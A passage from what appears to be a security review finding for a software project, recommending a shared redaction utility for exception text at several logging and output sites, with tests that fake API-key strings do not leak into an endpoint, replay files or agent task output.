a shared, reusable util (e.g. `security/redact.py`) and route every
`str(exc)` at the sinks above — `gateway.py:931`, `daemon.py:1919`, and the
log-only `routers/models.py:592,744`/`failover.py:38-46` sites — through it
before log/persist/return.

**Tests:** an `AUTH_ERROR`-classified provider exception whose text
contains a fake API-key-shaped string does not appear verbatim in
`GET /api/environment`'s `recent_failures`, in a replay JSON file under
`.gludd/replays/`, or in the task output returned to the invoking agent —
in each case the redacted/generic form appears instead; the existing
`test_secrets_log_sanitization.py` behavior is unchanged (regression guard
that the promoted-to-shared helper doesn't alter `SecretsManager`'s own
redaction).
